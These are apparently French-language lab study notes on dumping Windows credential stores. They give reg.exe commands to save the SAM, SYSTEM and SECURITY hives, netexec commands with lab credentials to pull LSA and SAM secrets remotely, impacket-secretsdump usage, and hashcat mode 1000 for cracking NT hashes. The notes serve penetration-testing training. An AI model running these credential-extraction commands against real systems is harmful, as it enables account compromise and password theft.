3 ruches à extraires pour décrypter le tout. Security pas nécessaire mais contient des hashes de comptes d'usagers du domaine.

|Registry Hive|Description|
|---|---|
|`hklm\sam`|Contains the hashes associated with local account passwords. We will need the hashes so we can crack them and get the user account passwords in cleartext.|
|`hklm\system`|Contains the system bootkey, which is used to encrypt the SAM database. We will need the bootkey to decrypt the SAM database.|
|`hklm\security`|Contains cached credentials for domain accounts. We may benefit from having this on a domain-joined Windows target.|

## Extraction des ruches
Doit être **admin** ou avoir **SeBackupPrivilege**
### reg.exe
```cmd-session
reg.exe save hklm\sam C:\sam.save
reg.exe save hklm\system C:\system.save
reg.exe save hklm\security C:\security.save
```
### netexec
Peut extraire les secrets de LSA ou la SAM
```shell-session
netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam
```

## Extraction des creds
### impacket-secretsdump
```
impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL
```

## Craquer
Utiliser hashcat mode 1000 sur les hash NT